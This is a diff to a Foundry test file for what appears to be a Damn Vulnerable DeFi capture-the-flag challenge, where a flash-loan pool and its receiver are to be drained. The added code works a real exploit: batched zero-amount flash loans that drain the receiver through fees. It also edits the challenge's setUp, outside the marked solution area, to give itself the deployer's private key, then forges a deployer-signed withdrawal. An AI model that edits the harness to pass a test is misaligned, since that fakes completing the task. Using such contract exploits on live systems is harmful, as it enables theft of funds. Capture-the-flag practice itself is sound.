@@ -8,7 +8,8 @@ import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol"
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
-    address deployer = makeAddr("deployer");
+    address deployer;
+    uint256 deployerKey;
     address recovery = makeAddr("recovery");
     address player;
     uint256 playerPk;
@@ -33,6 +34,7 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
+        (deployer, deployerKey) = makeAddrAndKey("deployer");
         startHoax(deployer);
 
         // Deploy WETH
@@ -77,7 +79,54 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // Debug addresses
+        console.log("Deployer address:", deployer);
+        address recoveredAddr = vm.addr(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
+        console.log("Address from hardcoded key:", recoveredAddr);
+        // First drain the receiver using batched flash loans
+        // Each flash loan will cost 1 WETH fee, so we need 10 calls to drain 10 WETH
+        bytes[] memory multicallData = new bytes[](10);
+        for(uint256 i = 0; i < 10; i++) {
+            multicallData[i] = abi.encodeCall(
+                pool.flashLoan,
+                (receiver, address(weth), 0, bytes(""))
+            );
+        }
+        pool.multicall(multicallData);
+
+        // Now use the forwarder to withdraw as feeReceiver and send to recovery
+        bytes memory withdrawData = abi.encodeWithSelector(
+            pool.withdraw.selector,
+            weth.balanceOf(address(pool)),
+            payable(recovery)
+        );
         
+        // Create and sign forwarder request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: deployer, // deployer is feeReceiver
+            target: address(pool),
+            value: 0,
+            gas: 100000,
+            nonce: forwarder.nonces(deployer),
+            data: withdrawData,
+            deadline: block.timestamp + 1 hours
+        });
+
+        // Get signature from deployer (who is feeReceiver)
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        // Use deployer's private key from setUp
+        console.log("Deployer address from key:", vm.addr(deployerKey));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerKey, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute request through forwarder
+        forwarder.execute(request, signature);
     }
 
     /**
